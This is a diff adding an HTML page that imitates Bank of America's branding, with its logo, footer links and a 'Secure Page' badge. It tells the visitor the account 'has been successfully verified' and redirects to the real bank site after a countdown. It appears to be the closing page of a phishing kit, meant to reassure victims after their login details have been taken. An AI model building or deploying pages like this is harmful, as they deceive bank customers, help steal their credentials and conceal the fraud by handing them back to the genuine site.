@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank of America | Online Banking | Log in | User ID</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style2.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <style>
+    .message-box {
+      text-align: center;
+      padding: 20px 40px;
+      background-color: #e6ffed;
+      border: 2px solid #a1e4b9;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 128, 0, 0.2);
+      margin-top: 30px;
+    }
+
+    .message-box h1 {
+      color: #2e8b57;
+      margin: 0;
+    }
+
+    .redirect-note {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .countdown {
+      font-weight: bold;
+      color: #2e8b57;
+    }
+  </style>
+</head>
+
+<body>
+  <section id="header2">
+    <a href="index.html" class="log">
+      <img src="img/Bank-of-America-Logo.png" width="300px" height="35px" class="logo" />
+    </a>
+    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
+  </section>
+
+  <section id="hero2">
+    <div class="bar">
+      <ul id="navbarr">
+        <h3>Account Verified</h3>
+      </ul>
+    </div>
+  </section>
+
+  <div class="container">
+    <div>
+      <h1>Your account has been successfully verified.</h1>
+      <p class="subtitle">
+        Your account has been successfully verified.Thank you for completing the verification process <br>
+        you're now being redirected to your login.
+      </p>
+    </div>
+
+    <div class="message-box">
+      <h1>✅ Account <br> Successfully Verified</h1>
+      <p class="redirect-note">Redirecting you to your login in <span class="countdown" id="countdown">10</span>
+        seconds...</p>
+    </div>
+  </div>
+
+  <script>
+    let seconds = 10;
+    const countdownEl = document.getElementById("countdown");
+
+    const countdownInterval = setInterval(() => {
+      seconds--;
+      countdownEl.textContent = seconds;
+
+      if (seconds <= 0) {
+        clearInterval(countdownInterval);
+        window.location.href = "https://www.bankofamerica.com/";
+      }
+    }, 1000);
+  </script>
+</body>
+<footer>
+  <div class="gray-bground-skin">
+    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+    <div class="link-container">
+      <div class="link-row">
+        <a href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank">Privacy</a>
+        <a href="https://www.bankofamerica.com/security-center/overview/" target="_blank">Security</a>
+        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+        <div class="clearboth"></div>
+      </div>
+    </div>
+    <p>
+      Bank of America, N.A. Member FDIC.
+      <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank">Equal Housing Lender</a>
+      <i class="fa fa-home"></i><br />© 2025 Bank of America Corporation.
+    </p>
+  </div>
+</footer>
+
+</html>
